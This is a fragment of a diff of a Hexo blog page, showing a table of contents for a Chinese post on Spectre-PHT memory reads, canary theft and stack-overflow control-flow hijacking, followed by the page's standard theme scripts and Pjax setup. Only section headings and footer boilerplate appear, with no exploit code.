class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9A%E8%AE%A1%E7%AE%97PIE%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="nav-number">3.1.</span> <span class="nav-text">步骤1：计算PIE偏移量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%9A%E5%88%A9%E7%94%A8Spectre-PHT%E8%AF%BB%E5%8F%96hijack%E5%87%BD%E6%95%B0%E7%9A%84%E6%8C%87%E4%BB%A4%E5%BA%8F%E5%88%97"><span class="nav-number">3.2.</span> <span class="nav-text">步骤2：利用Spectre-PHT读取hijack函数的指令序列</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81Spectre-PHT%E8%83%BD%E5%A4%9F%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E5%86%85%E5%AD%98%EF%BC%9A%E6%A0%88%E4%BF%9D%E6%8A%A4"><span class="nav-number">4.</span> <span class="nav-text">验证Spectre-PHT能够任意读取内存：栈保护</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9A%E8%AE%A1%E7%AE%97Canary%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="nav-number">4.1.</span> <span class="nav-text">步骤1：计算Canary的地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%9A%E5%88%A9%E7%94%A8gdb%E8%B0%83%E8%AF%95%E8%8E%B7%E5%8F%96%E7%9C%9F%E5%AE%9E%E7%9A%84Canary"><span class="nav-number">4.2.</span> <span class="nav-text">步骤2：利用gdb调试获取真实的Canary</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A43%EF%BC%9A%E5%88%A9%E7%94%A8Spectre-PHT%E8%B6%8A%E6%9D%83%E7%AA%83%E5%8F%96Canary%E5%B9%B6%E5%AF%B9%E6%AF%94"><span class="nav-number">4.3.</span> <span class="nav-text">步骤3：利用Spectre-PHT越权窃取Canary并对比</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E5%90%88Spectre-PHT%E4%B8%8E%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E7%8E%B0%E6%8E%A7%E5%88%B6%E6%B5%81%E5%8A%AB%E6%8C%81"><span class="nav-number">5.</span> <span class="nav-text">结合Spectre-PHT与栈溢出实现控制流劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9A%E5%87%86%E5%A4%87%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E7%8E%AF%E5%A2%83"><span class="nav-number">5.1.</span> <span class="nav-text">步骤1：准备栈溢出的环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%9A%E5%87%86%E5%A4%87payload"><span class="nav-number">5.2.</span> <span class="nav-text">步骤2：准备payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-number">6.</span> <span class="nav-text">参考文献</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/libs/anime.min.js"></script>
+
+<!-- local search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/local-search.min.js"></script>
+
+
+<!-- lazyload -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/lazyload.min.js"></script>
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/post/copyright-info.min.js"></script>
+        
+
+        <!-- share -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/post/share.min.js"></script>
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+    
+        
+    
+
+</body>
+</html>
